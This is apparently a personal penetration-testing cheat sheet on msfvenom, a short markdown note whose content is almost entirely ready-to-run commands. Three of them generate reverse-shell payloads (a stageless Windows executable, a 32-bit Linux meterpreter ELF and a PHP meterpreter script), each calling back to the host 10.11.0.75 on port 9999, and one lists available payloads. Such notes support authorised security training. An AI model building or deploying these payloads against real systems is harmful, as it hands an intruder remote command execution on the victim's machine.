---
tags: [shell]
---
# msfvenom

- [Metasploit Shell - InterceptZero](https://www.interceptzero.com/blog/metasploit-shell/)

## Windows TCP reverse shell (stageless) without meterpreter

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.75 LPORT=9999 -f exe > rewin.exe
```

## Linux 32bit TCP reverse shell (staged) with meterpreter

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.0.75 LPORT=9999 -f elf > reverse.elf
```

## PHP TCP reverse shell (staged) with meterpreter

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.11.0.75 LPORT=9999 -f raw
```

## List payloads with filters

```
msfvenom --list payloads --arch x64 --platform linux
```
